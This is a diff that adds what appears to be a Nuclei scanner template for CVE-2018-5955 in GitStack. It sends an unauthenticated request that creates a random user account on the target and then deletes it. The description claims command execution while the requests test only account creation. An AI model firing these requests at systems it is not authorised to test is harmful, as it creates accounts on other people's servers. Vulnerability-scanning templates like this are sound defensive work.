@@ -1,0 +1,50 @@
+id: CVE-2018-5955
+info:
+  name: GitStack Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    GitStack 2.3.10 and earlier versions have a command execution vulnerability due to insufficient filtering of user inputs. Attackers can exploit this to execute commands, causing significant harm.
+  reference:
+    - https://gitstack.com
+  classification:
+    cve-id: CVE-2018-5955
+    cvss-score: 9.8
+
+variables:
+  random_username: '{{rand_text_alphanumeric(10)}}'
+  random_password: '{{rand_text_alphanumeric(10)}}'
+
+http:
+  - raw:
+      - |
+        POST /rest/user/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{random_username}}&password={{random_password}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "User created"
+          - "User already exist"
+    extractors:
+      - type: regex
+        name: username
+        internal: true
+        regex:
+          - "username=(.*?)&"
+
+  - raw:
+      - |
+        DELETE /rest/user/{{random_username}}/ HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
